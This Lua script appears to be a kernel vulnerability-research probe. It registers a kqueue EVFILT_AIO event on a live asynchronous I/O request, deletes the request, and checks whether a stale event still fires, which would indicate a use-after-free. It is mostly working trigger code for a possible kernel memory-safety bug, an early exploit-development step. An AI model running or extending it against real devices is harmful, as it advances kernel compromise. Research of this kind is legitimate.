-- CRASH_CLASS: MODERATE
-- PROBE 1473a: EVFILT_AIO bound to a real AIO request, then the request deleted
--
-- Context:
--   1472a measured the AIO identifier space exactly: slot 0x212 stays constant across 24
--   poll/delete/submit cycles and the generation is three bits, so the identifier value repeats
--   every eight cycles.  Separately, 93d3 and 119a only ever registered EVFILT_AIO with ident 0,
--   which cannot bind to anything; no probe in the tree has ever put a REAL aio identifier into a
--   kevent.  That combination is the classic kqueue/aio lifetime question: the knote holds a
--   pointer to the aio request, and if the delete path does not detach the knote, making the
--   socket readable again completes a request that has been freed.
--
--   Phase A: does EVFILT_AIO accept a live request identifier at all?
--   Phase B: register, let the read complete, reap the event, delete the request, then write
--            again and see whether a second event arrives for the deleted identifier.
--   Phase C: the same with an identifier that was never a request, as the control.
--
--   A registered knote keeps the request alive; an event after the delete is the signal to keep.
--
-- -- prior art:
--   results/phase36_realargs/1472a_aio_gen_wrap_20261109_180953.txt (identifier space, 3-bit gen)
--   results/phase36_realargs/1447a_aio_stale_id_alias_20261109_180913.txt (662 status protocol)
--   probes/phase34_shm_race/93d3_kevent_sony_fuzz.lua (EVFILT_AIO with ident 0 only)
--   probes/phase17_new_vectors/119a_evfilt_proc_leak.lua (filter table, kevent struct shape)
--   probes/phase17_new_vectors/465a_aio_complete_then_delete.lua (669 request shape)

print("=== PROBE 1473a: EVFILT_AIO ON A LIVE AIO REQUEST ===")
print("")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local AIO_SUB  = make_syscall(669)
local AIO_POLL = make_syscall(664)
local AIO_DEL  = make_syscall(662)
local KQUEUE   = make_syscall(362)
local KEVENT   = make_syscall(363)
local GETPID   = make_syscall(20)
local SSOCKET  = make_syscall(135)
local WRITE    = make_syscall(4)
local MAP      = make_syscall(477)

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function sgn(rv) local n = to_num(rv) if n < 0 then return -1 end return n end
local function rd(a) local ok, v = pcall(function() return memory.read_dword(a) end) if ok then return to_num(v) % 4294967296 end return -1 end
local function rdq(a) local ok, v = pcall(function() return memory.read_qword(a) end) if ok then local h, l = (type(v) == "table" and v.h) and v.h or 0, to_num(v) % 4294967296 return h * 4294967296 + l end return -1 end
local function wr(a, v) pcall(function() memory.write_dword(a, uint64(v)) end) end
local function wrq(a, v) pcall(function() memory.write_qword(a, uint64(v)) end) end
local function hex(n) if n == nil then return "nil" end return string.format("0x%08X", n) end
local function as_addr(t) local s = tostring(t) local m = s:match("0x(%x+)") if m then return tonumber(m, 16) end return to_num(t) end

local pid = sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("canary getpid=%d", pid))
print("")

local ok, va = pcall(function() return MAP(uint64(0), uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local p = ok and to_num(va) or -1
if p < 0x10000 or p > 0x8000000000 then print("mmap failed -- aborting"); print("=== PROBE 1473a ABORT ==="); return end

local REQ    = p + 0x0000
local DATA   = p + 0x0100
local RESULT = p + 0x0200
local IDS    = p + 0x0300
local STATE  = p + 0x0400
local PAIR   = p + 0x0500
local CHG    = p + 0x0600     -- one kevent change
local EVT    = p + 0x0700     -- up to four events
local TS     = p + 0x0800     -- timespec

local sp = sgn(SSOCKET(uint64(1), uint64(1), uint64(0), uint64(PAIR), uint64(0), uint64(0)))
local rd_fd = rd(PAIR)
local wr_fd = rd(PAIR + 4)
print(string.format("[0] socketpair rv=%d read=%d write=%d", sp, rd_fd, wr_fd))
if rd_fd <= 0 then print("socketpair failed"); return end

local payload = memory.alloc(16)
local PL = as_addr(payload)
for i = 0, 15 do pcall(function() memory.write_byte(uint64(PL + i), 0x41 + i) end) end
local function feed() pcall(function() WRITE(uint64(wr_fd), uint64(PL), uint64(16), uint64(0), uint64(0), uint64(0)) end) end

local kq = sgn(KQUEUE(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] kqueue fd=%d", kq))
if kq < 0 then print("kqueue failed"); return end

local function arm_request()
    for j = 0, 0x24, 4 do wr(REQ + j, 0) end
    wrq(REQ + 0x08, 16)
    wrq(REQ + 0x10, DATA)
    wrq(REQ + 0x18, RESULT)
    wr(REQ + 0x20, rd_fd)
end

local function submit()
    arm_request()
    wr(IDS, 0)
    wrq(RESULT, 0)
    sgn(AIO_SUB(uint64(1), uint64(REQ), uint64(1), uint64(1), uint64(IDS), uint64(0)))
    return rd(IDS)
end

-- one kevent change
local function kev(ident, filter, flags, fflags, timeout_ms)
    wrq(CHG + 0x00, ident)
    -- struct kevent: ident(8) filter(2) flags(2) fflags(4) data(8) udata(8).
    -- The two 16-bit fields are written as one dword so the probe does not depend on a
    -- memory.write_word binding: little-endian dword at +8 = filter | flags << 16.
    wr(CHG + 0x08, ((flags % 65536) * 65536 + (filter % 65536)) % 4294967296)
    wr(CHG + 0x0C, fflags)
    wrq(CHG + 0x10, 0)
    wrq(CHG + 0x18, 0)
    for i = 0, 3 do
        wrq(EVT + i * 0x20, 0); wrq(EVT + i * 0x20 + 0x08, 0)
        wrq(EVT + i * 0x20 + 0x10, 0); wrq(EVT + i * 0x20 + 0x18, 0)
    end
    if timeout_ms and timeout_ms > 0 then
        wrq(TS, 0); wrq(TS + 8, timeout_ms * 1000000)
    else
        wrq(TS, 0); wrq(TS + 8, 0)
    end
    local rv = sgn(KEVENT(uint64(kq), uint64(CHG), uint64(1), uint64(EVT), uint64(4), uint64(TS)))
    return rv, rdq(EVT), rd(EVT + 0x08) % 65536, rd(EVT + 0x0C)
end

local EV_ADD, EV_DELETE, EV_CLEAR = 0x1, 0x2, 0x20
local EVFILT_AIO = -3

--------------------------------------------------------------------------
-- [A] a live, pending request: does EVFILT_AIO accept it?
--------------------------------------------------------------------------
print("[A] EVFILT_AIO on a live pending request")
local id1 = submit()
print(string.format("  request id=%s (no data in the socket, so it is pending)", hex(id1)))
local rv, ev_ident, ev_filter = kev(id1, EVFILT_AIO, EV_ADD, 0, 0)
print(string.format("  EV_ADD -> rv=%d", rv))
local rv0, i0, f0 = kev(id1, EVFILT_AIO, EV_ADD, 0, 0)
print(string.format("  EV_ADD again (idempotent control) -> rv=%d", rv0))
print("")

--------------------------------------------------------------------------
-- [B] complete the read, reap the event, delete the request, write again
--------------------------------------------------------------------------
print("[B] complete, reap, delete, then trigger again")
feed()
local rv1, e1, f1, ff1 = kev(id1, EVFILT_AIO, 0, 0, 100)
print(string.format("  after feed: kevent rv=%d ident=%s filter=%d", rv1, hex(e1), f1))

wr(STATE, 0x5A5A5A5A)
local rvp = sgn(AIO_POLL(uint64(IDS), uint64(1), uint64(STATE)))
print(string.format("  664 poll -> rv=%d state=%s", rvp, hex(rd(STATE))))

wr(IDS, id1)
wr(STATE, 0x5A5A5A5A)
local rvd = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
print(string.format("  662 delete -> rv=%d state=%s", rvd, hex(rd(STATE))))

feed()
local rv2, e2, f2, ff2 = kev(id1, EVFILT_AIO, 0, 0, 100)
print(string.format("  after delete + feed: kevent rv=%d ident=%s filter=%d", rv2, hex(e2), f2))
if rv2 > 0 then
    print("  *** an event arrived for the DELETED identifier ***")
else
    print("  no event for the deleted identifier")
end
local rvdel = kev(id1, EVFILT_AIO, EV_DELETE, 0, 0)
print(string.format("  EV_DELETE on the deleted identifier -> rv=%d", rvdel))
print("")

--------------------------------------------------------------------------
-- [C] control: an identifier that was never a request
--------------------------------------------------------------------------
print("[C] EVFILT_AIO on an identifier that never existed")
local rv3 = kev(0x0FFF, EVFILT_AIO, EV_ADD, 0, 0)
print(string.format("  EV_ADD ident=0x0FFF -> rv=%d", rv3))
local rv4 = kev(0, EVFILT_AIO, EV_ADD, 0, 0)
print(string.format("  EV_ADD ident=0 -> rv=%d", rv4))
print("")

--------------------------------------------------------------------------
-- [D] a second request, deleted while the knote is still armed and ONESHOT
--------------------------------------------------------------------------
print("[D] request deleted, socket written eight more times")
local id2 = submit()
print(string.format("  request id=%s", hex(id2)))
local rv5 = kev(id2, EVFILT_AIO, EV_ADD, 0, 0)
print(string.format("  EV_ADD -> rv=%d", rv5))
wr(IDS, id2); wr(STATE, 0x5A5A5A5A)
sgn(AIO_POLL(uint64(IDS), uint64(1), uint64(STATE)))
wr(IDS, id2); wr(STATE, 0x5A5A5A5A)
local rvd2 = sgn(AIO_DEL(uint64(IDS), uint64(1), uint64(STATE)))
print(string.format("  poll+delete -> rv=%d state=%s", rvd2, hex(rd(STATE))))
local fired = 0
for n = 1, 8 do
    feed()
    local rvn, en = kev(id2, EVFILT_AIO, 0, 0, 50)
    if rvn > 0 then fired = fired + 1 end
end
print(string.format("  events after the delete: %d of 8", fired))
if fired > 0 then print("  *** stale knote fired ***") end

print("")
print(string.format("[Z] alive pid=%d (was %d)", sgn(GETPID(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))), pid))
print("")
print("=== PROBE 1473a COMPLETE ===")
